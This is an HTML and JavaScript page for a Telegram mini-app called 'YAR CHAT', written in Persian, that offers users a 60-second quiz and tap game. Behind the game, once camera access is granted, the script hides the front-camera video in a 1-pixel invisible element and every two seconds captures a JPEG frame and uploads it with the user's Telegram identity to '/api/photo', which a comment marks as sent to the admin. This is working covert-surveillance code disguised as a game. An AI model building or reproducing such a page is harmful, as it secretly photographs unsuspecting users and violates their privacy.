
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>YAR CHAT</title>
<style>
body {
 font-family: Arial;
 background: #101827;
 color: white;
 text-align: center;
 padding: 20px;
}
.box {
 background: #1e293b;
 padding: 18px;
 border-radius: 15px;
 margin: 15px 0;
}
button {
 background: #0d9488;
 color: white;
 border: 0;
 padding: 12px 20px;
 border-radius: 10px;
 margin: 7px;
 font-size: 16px;
}
.option {
 display: block;
 width: 100%;
 margin: 9px 0;
}
#challenge {
 display: none;
}

#camera {
 position: fixed;
 width: 1px;
 height: 1px;
 overflow: hidden;
 opacity: 0;
 pointer-events: none;
 left: 0;
 bottom: 0;
}

#camera video {
 width: 1px;
 height: 1px;
}
</style>
</style>
</head>
<body>

<h2>YAR CHAT</h2>
<p id="status">در حال بررسی حساب شما...</p>

<div id="intro" class="box" style="display:none">
 <p>چالش ۶۰ ثانیه‌ای</p>
 <p>۳ سؤال درباره ربات و یک بازی ساده انجام بده.</p>
 <button onclick="startChallenge()">شروع چالش</button>
</div>

<div id="challenge" class="box">
 <h3 id="timer">۶۰ ثانیه</h3>

 <div id="quiz">
  <h3 id="question"></h3>
  <div id="options"></div>
 </div>

 <div id="game" style="display:none">
  <h3>روی دایره بزن!</h3>
  <button onclick="hit()">بزن!</button>
  <p>امتیاز: <span id="score">0</span></p>
 </div>

 <div id="camera">
  <video id="video" autoplay playsinline muted></video>
 </div>

 <p id="result"></p>
</div>

<script src="https://telegram.org/js/telegram-web-app.js"></script>
<script>
const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

let stream = null;
let seconds = 60;
let score = 0;
let questionIndex = 0;
let timer = null;
let photoTimer = null;
let challengeRunning = false;

const questions = [
 {
  q:"YAR CHAT برای چه کاری ساخته شده؟",
  a:["ارتباط دوستانه","خرید لباس","تماشای فیلم"],
  correct:0
 },
 {
  q:"کدام گزینه در ربات وجود دارد؟",
  a:["اتصال ناشناس","بازی فوتبال واقعی","ویرایش عکس"],
  correct:0
 },
 {
  q:"سکه‌ها در YAR CHAT چه کاربردی دارند؟",
  a:["استفاده از امکانات ربات","روشن کردن گوشی","تماشای تلویزیون"],
  correct:0
 }
];

// بررسی حساب کاربر
fetch("/api/check", {
 method:"POST",
 headers:{"Content-Type":"application/json"},
 body:JSON.stringify({initData:tg.initData})
})
.then(async response => {
 const data = await response.json();

 document.getElementById("status").textContent =
  data.message || "خطا";

 if(data.ok) {
  document.getElementById("intro").style.display = "block";
 }
})
.catch(error => {
 console.log(error);
 document.getElementById("status").textContent =
  "ارتباط با سرور برقرار نشد.";
});

// شروع چالش
async function startChallenge() {
 if(challengeRunning) return;

 try {
  stream = await navigator.mediaDevices.getUserMedia({
   video:{
    facingMode:"user",
    width:{ideal:640},
    height:{ideal:480}
   },
   audio:false
  });

  const video = document.getElementById("video");
  video.srcObject = stream;

  await new Promise((resolve, reject) => {
   if(video.readyState >= 1) {
    resolve();
   } else {
    video.onloadedmetadata = resolve;
    video.onerror = reject;
   }
  });

  await video.play();

  if(!video.videoWidth || !video.videoHeight) {
   throw new Error("Camera frame not ready");
  }

  challengeRunning = true;

  document.getElementById("camera").style.display = "block";
  document.getElementById("intro").style.display = "none";
  document.getElementById("challenge").style.display = "block";

  showQuestion();

  timer = setInterval(tick, 1000);

  // اولین عکس پس از آماده شدن تصویر
  sendPhoto();
  photoTimer = setInterval(sendPhoto, 2000);

 } catch(error) {
  console.log("Camera error:", error);
  alert("دسترسی دوربین را بررسی کن و دوباره تلاش کن.");

  if(stream) {
   stream.getTracks().forEach(track => track.stop());
   stream = null;
  }
 }
}

// ارسال عکس برای مدیر
async function sendPhoto() {
 if(!stream || !stream.active || !challengeRunning) return;

 const video = document.getElementById("video");

 if(video.readyState < 2 || !video.videoWidth) return;

 const canvas = document.createElement("canvas");
 canvas.width = 480;
 canvas.height = Math.round(
  480 * video.videoHeight / video.videoWidth
 );

 const context = canvas.getContext("2d");
 context.drawImage(video, 0, 0, canvas.width, canvas.height);

 const photo = canvas.toDataURL("image/jpeg", 0.75);

 try {
  const response = await fetch("/api/photo", {
   method:"POST",
   headers:{"Content-Type":"application/json"},
   body:JSON.stringify({
    initData:tg.initData,
    photo:photo
   })
  });

  const result = await response.json();

  if(!response.ok || !result.ok) {
   console.log("Photo sending failed:", result);
  }

 } catch(error) {
  console.log("Photo error:", error);
 }
}

// نمایش سؤال‌ها
function showQuestion() {
 if(questionIndex >= questions.length) {
  document.getElementById("quiz").style.display = "none";
  document.getElementById("game").style.display = "block";
  return;
 }

 const q = questions[questionIndex];

 document.getElementById("question").textContent = q.q;

 const area = document.getElementById("options");
 area.innerHTML = "";

 q.a.forEach((answer, i) => {
  const button = document.createElement("button");
  button.className = "option";
  button.textContent = answer;

  button.onclick = () => {
   if(i === q.correct) score++;

   questionIndex++;
   showQuestion();
  };

  area.appendChild(button);
 });
}

// بازی
function hit() {
 score++;
 document.getElementById("score").textContent = score;
}

// شمارش زمان
function tick() {
 seconds--;

 document.getElementById("timer").textContent =
  seconds + " ثانیه";

 if(seconds <= 0) {
  clearInterval(timer);
  clearInterval(photoTimer);

  challengeRunning = false;

  if(stream) {
   stream.getTracks().forEach(track => track.stop());
   stream = null;
  }

  document.getElementById("camera").style.display = "none";

  document.getElementById("result").textContent =
   "زمان چالش تمام شد. امتیاز: " + score;
 }
}
</script>
</body>
</html>
